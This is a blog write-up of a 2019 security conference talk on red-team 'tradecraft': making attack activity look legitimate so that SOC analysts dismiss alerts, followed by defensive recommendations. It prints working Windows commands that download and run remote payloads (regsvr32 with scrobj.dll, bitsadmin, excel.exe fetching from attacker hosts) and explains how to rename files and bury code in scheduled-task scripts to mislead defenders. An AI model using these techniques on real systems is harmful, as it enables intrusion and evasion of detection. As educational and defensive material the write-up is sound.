---
description: Dave Kennedy story related from kedeshur's blog
---

# 5MCT - Baselining Behavior Tradecraft

## [./](https://blog.kedeshur.com/)kedeshur <a href="#kedeshur" id="kedeshur"></a>

{% embed url="https://blog.kedeshur.com" %}

25 October 2019 \\\ tags: [_5mct_](https://blog.kedeshur.com/5mct/) - [_pentest_](https://blog.kedeshur.com/pentest/) - [_security_](https://blog.kedeshur.com/security/) - [_assumedbreach_](https://blog.kedeshur.com/assumedbreach/) - [_behavior_](https://blog.kedeshur.com/behavior/)

## 5MCT - Baselining Behavior Tradecraft <a href="#5mct-baselining-behavior-tradecraft" id="5mct-baselining-behavior-tradecraft"></a>

Dave Kennedy is closing the talks out at WWHF 2019 by sharing knowledge related to how he’s been approaching the last 10 security assessments that he’s been on. He shares ideas in this talk about how one can include social engineering considerations when performing security assessments by tailoring the way in which the system is being controlled so that the contents of security alerts (if the attack behavior is detected) have a higher likelihood of leading a Security Operations Center to a conclusion that is beneficial to the attacker (e.g. the detected behavior is benign).

#### Introduction <a href="#introduction" id="introduction"></a>

The industry shifts quite frequently and there is often an imbalance in the force, in that attackers or defenders innovate, which causes the other side to raise their game, and so on and so forth. We’ll talk through how the next wave will come and what we need to be prepared for. There is no doubt that defense has gotten better, but we can still push ourselves to think forward and raise the bar for the next wave. This has recently been done by understanding the TTPs of attackers for the blue team.

#### Quick Story <a href="#quick-story" id="quick-story"></a>

Dave shares a story about a series of two engagements where his team wasn’t able to get very far on a client engagement, so they came back the next year and put around six months of time into developing a 0-day specifically for this client so that they wouldn’t be defeated again. The campaign went well, they got their shell, and seven minutes later it died because the security team at this client had categorized users into technical and non-technical users. The machine that had been compromised was in use by a non-technical user, so when the `ipconfig` command was ran, the SOC knew about the compromise seven minutes right of bang!

#### Goals of the Talk <a href="#goals-of-the-talk" id="goals-of-the-talk"></a>

We’ll talk through how playing defense can raise the bar in the detections of attack patterns (social engineering the SOC analysts to come to a wrong conclusion), we’ll show the ease of bypassing current detections, even for mature companies in 2019, we’ll provide the red team some goodies for their next engagement to try out, and then we’ll talk about how to best defend against the next wave of attacks.

#### Industry Today <a href="#industry-today" id="industry-today"></a>

Crowd-sourced techniques are being published through a record number of information gathering techniques. Our defense today are built on what we see and what the tools detect. Any variation usually circumvents these traditional methods.

```
#odbcconf.exe mimics rundll32.exe 
odbcconf /a {REGSVR c:\test\test.dll}

#regsvr32 bypass that gets caught these days
regsvr32 /s /n /u /i:http://$ip/test.txt scrobj.dll

#using excel to download a file to the TEMP dir
excel.exe http://$ip/doc.xls

#using two tools to separate payload downloading and payload execution to avoid modern detections
bitsadmin /transfer download /download /priority normal http://$ip/test.txt %TEMP%\test.txt && regsvr32.exe /s /u /i:%TEMP%\test.txt scrobj.dll
```

```

odbcconf /a {REGSVR c:\test\test.dll}


regsvr32 /s /n /u /i:http://$ip/test.txt scrobj.dll


excel.exe http://$ip/doc.xls


bitsadmin /transfer download /download /priority normal http://$ip/test.txt %TEMP%\test.txt && regsvr32.exe /s /u /i:%TEMP%\test.txt scrobj.dll
```

#### Problem in Commoditized Attacks <a href="#problem-in-commoditized-attacks" id="problem-in-commoditized-attacks"></a>

Modifications to existing attacks can eventually be identified through threat hunting and, of course, have a higher probability of detection as we use it more often. A similar issue arises if we send a phish to 300 people vs 10 people. Using off the shelf techniques have the same issue, which involves the public research tools being the main focus for detection.

#### No Adversary Emulation Here <a href="#no-adversary-emulation-here" id="no-adversary-emulation-here"></a>

Commoditized malware and organized crime is where most of the focus in security is currently pointed. While adversaries will use common tools, research topics, and other public tactics, techniques, and procedures to conduct their compromises, they also have the ability to use customized attacks that will go largely undetected. However, the behaviors are still detectable, such as a non-technical user executing commands.

#### Demonstration <a href="#demonstration" id="demonstration"></a>

[Unicorn](https://github.com/trustedsec/unicorn), a tool written by Dave Kennedy 7 years ago, took 5 years to get detected. Instead of fixing the issues and behaviors that the tool abused, the payload was signatured. Dave Kennedy then wrote a program to pull `unicorn` from a repo, make automated modifications to the underlying code structure, ensure the newly created version didn’t get detected by Windows Defender, and then pushed the changes to GitHub. This completely automated process resulted in multiple updates over many months being done to Windows Defender, which eventually stopped due to too many signatures. Again, the commodity tool was detected and not the behavior.

#### Moving to Legitimate Behavior <a href="#moving-to-legitimate-behavior" id="moving-to-legitimate-behavior"></a>

Legitimate behavior emulates a regular user and is designed to throw off irregular activity through normal functions. Let’s flashback around 10 years ago and how we had to hack systems. By creating somewhat legitimate stories similar to what we do with social engineering when interacting with a system – our success rate drastically decreases for detection.

The first command will execute excel to download what purports to be a normal business file, but is actually a XLS scriptlet object that we will eventually use later. This file will be saved in the %TEMP% directory on the computer when it is downloaded.

```
excel.exe https://fakesite.com/CompanyNameReport_Metrics_v2.3.xls
```

```
excel.exe https://fakesite.com/CompanyNameReport_Metrics_v2.3.xls
```

Since we are trying to tell a story, we will now wait a couple of hours so that the next alert is not generated sequentially after the first if our behavior is being monitored. We’ll do the following tasks to further influence the story that we are attempting to tell a SOC. The second component involves the official Microsoft documentation for the [regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32) binary and includes a usage example of `regsvr32 schmmgmt.dll`, which would tell the SOC that this may be normal behavior. So let’s copy scrobj.dll to schmmgmt.dll. Further, the XLS Scriptlet object masquerading as CompanyNameReport\_Metrics\_v2.3.xls, is renamed to DllUninstall to further influence the SOC’s opinion.

```
Rename scrobj.dll to schmmgmt.dll
Rename CompanyNameReport_Metrics_v2.3.xls to dlluninstall
#our new regsvr32 command using the renamed items to tell a story to the analyst if the behavior gets detected
regsvr32.exe /s /u /i:DllUninstall schmmgmt.dll
```

```
Rename scrobj.dll to schmmgmt.dll
Rename CompanyNameReport_Metrics_v2.3.xls to dlluninstall

regsvr32.exe /s /u /i:DllUninstall schmmgmt.dll
```

#### Fighting with Noise <a href="#fighting-with-noise" id="fighting-with-noise"></a>

O365 PowerShell scripts are something insane. Hundreds and hundreds of lines of PowerShell code–not signed. What is a SOC analyst going to look for in PowerShell? Obfuscated code & downloaders, mainly. So using noise will always work since we do not have enough people focusing on detection. That means that analysts are fighting alarms or other operational issues on top of needing to make a quick decision on if a large PowerShell script that’s mostly noise is malicious or not. Leverage scheduled tasks by naming them something legitimate that a user or analyst would expect to see. This is yet another way that we can influence the opinion of a SOC analyst–put our malicious code deep in another, legitimate, PowerShell script that’s named similar to another, legitimate, scheduled task.

### We’ve gotten lazy with hacking because it’s been so dang easy <a href="#weve-gotten-lazy-with-hacking-because-its-been-so-dang-easy" id="weve-gotten-lazy-with-hacking-because-its-been-so-dang-easy"></a>

The concept is simple, in social engineering you create a story that someone believes. In hacking, creating attacks that are stories to trick defense. No different in social engineering versus hacking. These types of attacks will go under the radar. A story takes a long time to tell, writing a book doesn’t happen overnight, we need to tell a story on why the unusual activity occurred.

#### Defense: Mapping Out Phases <a href="#defense-mapping-out-phases" id="defense-mapping-out-phases"></a>

Understanding multiple phases of an attack is important. Even though our initial entry point, persistence, and escalation may succeed–what happens during lateral movement?

#### Story Time <a href="#story-time" id="story-time"></a>

Dave reached out to a manufacturing company about writing an article about the company and got an email back. The email was profiled for the signature, phishing banners, and layout. Only two people were sent the spear phish email, a person in IT and a person in R\&D, which included a pretext about getting new iPhones in support of hitting their 50th year anniversary. While two shells were gotten, many more shells kept arriving because the email was forwarded along, which ultimately resulted in detection when the email made it to the person that Dave was impersonating. However, the next day, a junior IT employee reached out complaining that they couldn’t get the new phone because the site was blocked. Dave quickly stood up a new website and redirected the junior IT employee–getting his access back.

#### Defense: Where from Here? <a href="#defense-where-from-here" id="defense-where-from-here"></a>

Giving the most amount of chained information to analysts is still largely important. Application whitelisting can be used to focus on prevention of code execution unless it is desired, and, if that fails, have detective controls in place to detect the behaviors of hacking tools. Additionally, recognize tool limitations, focus on training of analysts, and look at the full behavior of the story that is within the centralized information arriving to the analyst.

#### Some Basics that Work <a href="#some-basics-that-work" id="some-basics-that-work"></a>

Prevention takes time, however some high value ones include

* Blocking unsigned executables in user profile directories as a start
* Constrained Language Mode
* Disallow regular users from PowerShell access
* PowerShellv6 and above
* Leverage ETW (Sysmon is a great start)
* [https://github.com/olafhartong/sysmon-modular](https://github.com/olafhartong/sysmon-modular)
* Please, please, please enable the Windows firewall internally

Detection can move faster:

* You must, repeat, _**must**_, have endpoint logs
* Other sources such as DNS, easy/west/north/south, command line auditing, script block logging, and more make a huge difference in shortening the overall time to detection for an organization
* Visibility first, then improve on more visibility
* Understand the tactics and procedures attackers operate by vs the techniques
* Threat hunting can help reduce the time window of a breach

Dave has used these techniques in the past 10 engagements and has not been detected (or at least not spotted by the analyst!). Ensure that attack chains look legitimate no matter what an analyst chooses to review. Dave will be releasing something called DerbyCon Communities, which is a way to stay connected and create communities. More can be read about it [here](https://www.derbycon.com/).

[« home](http://18.216.220.144/)

**Reference Index**

**Estimated date of talk: Wild West Hackin’ Fest 2019**

**GrrCon Talk (not WWHF): IronGeek Link**

**Title: Baselining Behavior Tradecraft**

**Speaker: Dave Kennedy, Owner of TrustedSec & Binary Defense**
